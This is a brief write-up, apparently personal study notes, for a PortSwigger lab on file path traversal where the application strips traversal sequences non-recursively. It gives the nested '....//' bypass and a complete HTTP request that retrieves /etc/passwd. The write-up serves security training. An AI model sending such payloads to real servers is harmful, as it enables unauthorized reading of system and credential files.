# 3 - Traversal sequences stripped non-recursively

> This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.
>
>  The application strips [path traversal](https://portswigger.net/web-security/file-path-traversal) sequences from the user-supplied filename before using it.
>
>  To solve the lab, retrieve the contents of the `/etc/passwd` file.

Recordar:  You might be able to use nested traversal sequences, such as `....//` or `....\/`, which will revert to simple traversal sequences when the inner sequence is stripped.

```text
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
```

 

